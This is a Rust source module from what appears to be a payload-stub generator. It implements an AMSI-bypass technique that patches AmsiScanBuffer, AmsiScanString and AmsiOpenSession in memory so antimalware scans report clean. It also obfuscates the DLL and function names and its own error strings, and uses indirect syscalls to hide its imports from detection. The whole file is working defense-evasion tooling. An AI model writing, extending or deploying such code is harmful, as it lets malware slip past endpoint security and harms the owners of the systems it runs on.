//! AMSI patch.
//!
//! Patches `AmsiScanBuffer` (and, optionally, `AmsiScanString` and
//! `AmsiOpenSession`) in the current process so AMSI scans always report clean.
//! A Preparation technique: it modifies the process state and never runs the
//! payload. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the AMSI patch.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Also patch `AmsiScanString`, the scan entry some hosts use for string
    /// content instead of a buffer. Best effort.
    #[serde(default = "default_true")]
    pub scan_string: bool,

    /// Also patch `AmsiOpenSession`, so a caller that opens a session first is
    /// handed a null one instead of a real handle. Best effort; the scan
    /// exports are patched too, so the session is never dereferenced.
    #[serde(default = "default_true")]
    pub open_session: bool,
}

/// Default for the optional patch flags: cover every variant.
///
/// Each patch is best effort, so on-by-default costs nothing when a build does
/// not export the variant.
pub fn default_true() -> bool {
    true
}

impl Default for Params {
    /// Defaults to patching every variant (see [`default_true`]).
    fn default() -> Self {
        Self {
            scan_string: default_true(),
            open_session: default_true(),
        }
    }
}

/// Static metadata for the AMSI patch.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "patch_amsi",
    attck: &["T1562.001"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/patch_amsi/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: patch_amsi\nparams:\n  scan_string: true\n  open_session: true\n",
    // The page protection changes go through the syscall layer, so
    // `mode: indirect` removes the `VirtualProtect` import. Resolution
    // (`LoadLibraryA`/`GetProcAddress`) stays Win32, as in every technique.
    syscalls: &["NtProtectVirtualMemory"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all a technique keyword
/// like `loader` — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_LOAD_FAILED$", "failed to load the library to patch"),
    (
        "$MSG_RESOLVE_FAILED$",
        "failed to resolve the function to patch",
    ),
    (
        "$MSG_MAKE_WRITABLE_FAILED$",
        "failed to make the target function writable",
    ),
    (
        "$MSG_RESTORE_PROTECTION_FAILED$",
        "failed to restore the target function protection",
    ),
];

impl Params {
    /// Renders the AMSI-patch stub fragment, obfuscating the `amsi.dll`, every
    /// scan-export name and every diagnostic message through `strings` so they
    /// are rebuilt at runtime, and baking in which optional variants are patched
    /// too.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let amsi_dll = strings.obfuscate("amsi.dll").render_stub_expr("amsi_dll");
        let amsi_func = strings
            .obfuscate("AmsiScanBuffer")
            .render_stub_expr("amsi_func");
        let amsi_scan_string_func = strings
            .obfuscate("AmsiScanString")
            .render_stub_expr("amsi_scan_string_func");
        let amsi_open_session_func = strings
            .obfuscate("AmsiOpenSession")
            .render_stub_expr("amsi_open_session_func");

        // Each error path gets the same treatment as the DLL and function
        // names: the message is rebuilt from obfuscated bytes at runtime, so no
        // diagnostic text reaches `.rdata`.
        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("amsi_msg_{index}")),
            );
        }

        rendered
            .replace("$AMSI_DLL_DEF$", &amsi_dll)
            .replace("$AMSI_FUNC_DEF$", &amsi_func)
            .replace("$AMSI_SCAN_STRING_FUNC_DEF$", &amsi_scan_string_func)
            .replace("$AMSI_OPEN_SESSION_FUNC_DEF$", &amsi_open_session_func)
            .replace(
                "$PATCH_SCAN_STRING$",
                if self.scan_string { "true" } else { "false" },
            )
            .replace(
                "$PATCH_OPEN_SESSION$",
                if self.open_session { "true" } else { "false" },
            )
    }
}

#[cfg(test)]
mod tests;
